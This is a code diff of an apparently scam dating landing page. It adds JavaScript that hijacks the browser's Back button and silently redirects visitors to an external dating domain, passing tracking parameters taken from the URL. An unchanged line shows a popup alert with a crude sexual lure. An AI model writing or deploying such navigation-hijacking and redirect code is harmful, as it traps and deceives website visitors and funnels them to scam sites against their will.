@@ -454,14 +454,12 @@
 
 <body style="">
     <script type="text/javascript" src="backfix.min.js"></script>
-
-    <script type="text/javascript">
-        bajb_backdetect.OnBack = function() {
-            window.history.back = function() {
-                document.location = 'http://vvvv.perfect-dating-match.com/1a7366da-77e5-4eab-9727-64b2d27f1645?l=1&s={dynamicSITE}&c={dynamicCMP}&p={dynamicPUB}&ct={dynamicCON}&dt={dynamicDTY}&do={dynamicDOS}'
-            }
-        }
-    </script>
+  <script type="text/javascript">
+  function h(w) {return decodeURI((RegExp(w + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || '');}
+	bajb_backdetect.OnBack = function(){window.history.back=function(){
+	var u = 'http://vvvv.perfect-dating-match.com/1a7366da-77e5-4eab-9727-64b2d27f1645?l=1&s=' + h('s') + '&c=' + h('c') + '&p=' + h('p') + '&ct=' + h('ct') + '&dt=' + h('dt') + '&do=' + h('do');
+	document.location=u;
+	}}</script>
     <script>
         alert("WARNING!\n\nWomen you know and women near you are looking for a FUCK BUDDY tonight!\n Do you want to see their photos?");
     </script>
